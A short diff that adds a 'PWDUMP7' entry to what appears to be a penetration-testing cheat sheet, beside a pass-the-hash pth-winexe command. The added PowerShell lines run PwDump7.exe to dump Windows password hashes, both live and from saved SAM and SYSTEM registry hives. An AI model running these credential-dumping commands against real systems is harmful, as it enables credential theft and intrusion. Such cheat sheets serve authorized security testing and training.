@@ -3159,6 +3159,16 @@ pth-winexe -U domain_here/user_name_here%LM+NTLM_hash_here //SMB_share_here comm
 ```
 
 
+## PWDUMP7
+```powershell
+# dump passwords
+.\PwDump7.exe
+
+# dump passwords from registry hives
+.\PwDump7.exe -s SAM.save SYSTEM.save
+```
+
+
 
 ## PYTHON & PYTHON3
 ```python
